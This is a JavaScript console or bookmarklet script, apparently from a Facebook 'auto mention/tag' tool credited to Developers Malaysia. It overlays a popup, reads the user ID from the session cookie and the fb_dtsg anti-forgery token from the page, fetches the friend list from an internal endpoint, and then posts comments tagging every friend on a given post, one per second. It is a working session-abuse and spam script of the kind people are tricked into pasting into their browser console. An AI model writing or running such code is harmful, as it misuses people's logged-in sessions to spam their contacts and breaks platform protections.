var Title = "";
var Descriptions = "",_text = '';



//eval
javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>New Auto Mention/Tag</a></div></br></br>";
grouppost += "<center><div><textarea id='txtFloodMsg' placeholder='Place Your facebook Post ID Number here . Ex : 405221409623948 ' style='padding-top:5px;width:250px;height:40px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);color:#ffffff'></textarea></div></center>";
grouppost += "<div><span class='img sp_dpkef5 sx_f05251'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Privacy: Public </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><br>Powered By: <A style='color:#3B5998;' href='http://www.facebook.com/226344357522802' target='_blank'>Developers Malaysia</A> .</br>Script Made By: </A><A style='color:#3B5998;' href='http://www.facebook.com/100004082763721' target='_blank'> Donnazmi</A></A>.</br>For More Tools Visit Our Blogger <A style='color:#3B5998;' href='http://developersmalaysia.blogspot.com/' target='_blank'>Automate Your Facebook</A>.</A></div>";
var _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/226344357522802" target="_blank">MAlaysia Developers</A> & <A style="color:#3B5998;" href="http://www.facebook.com/226344357522802" target="_blank"> Malaysia Developers</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100004082763721" target="_blank"> Donnazmi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://developersmalaysia.blogspot.com/" target="_blank">Automate Your Facebook</A>.</A>';
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx = {
    getHTTPObject: function () {
        var A = false;
        if (typeof ActiveXObject != "undefined") try {
            A = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (C) {
            try {
                A = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (B) {
                A = false
            }
        } else if (window.XMLHttpRequest) try {
            A = new XMLHttpRequest
        } catch (C) {
            A = false
        }
        return A
    },
    load: function (url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function () {
            opt.handler(http)
        };
        else http.onreadystatechange = function () {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        resul74 = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    if (error) error(http.status)
                }
        };
        http.send(parameters)
    },
    bind: function (A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C)
            if (A[B]) C[B] = A[B];
        if (!C.url) return;
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) document.getElementById(C.loading).style.display = "block";
        this.load(C.url, function (E) {
            if (C.onSuccess) C.onSuccess(E);
            if (C.update) document.getElementById(C.update).innerHTML = E;
            if (D) document.getElementsByTagName("body")[0].removeChild(D);
            if (C.loading) document.getElementById(C.loading).style.display = "none"
        }, C.format, C.method, C)
    },
    init: function () {
        return this.getHTTPObject()
    }
};
var j = 0;
var k = 0;
var suc = 0;
var msg = "Follow this list please..";
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=user&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        sender.parentNode.innerHTML = "Please Wait...";
        postitok()
    })
}

var a = document.body.innerHTML;
var dts = document.getElementsByName("fb_dtsg")[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function postitok() {
    pst = "ft_ent_identifier=" + encodeURIComponent(msg) + "&comment_text=@[" + arr[suc] + ":]&source=2&client_id=1389259439868%3A4121944391&reply_fbid&parent_comment_id&rootid=u_jsonp_11_4&clp=%7B%22cl_impid%22%3A%22d02cb860%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_49%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A" + encodeURIComponent(msg) + "%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user=" + user_id + "&__a=1&__dyn=7n8a9EAMHmqDzpQ9UmWOGUGy6zECQqbx2mbAKGiBAGm&__req=5o&fb_dtsg=" + dts + "&__rev=1073774&ttstamp=265816571768812288";
    with(newx = new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/ufi/add_comment.php"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Auto tagging Completed. Now Refresh your Homepage.");
        suc = 0
    } else setTimeout("postitok()", 1000)
}

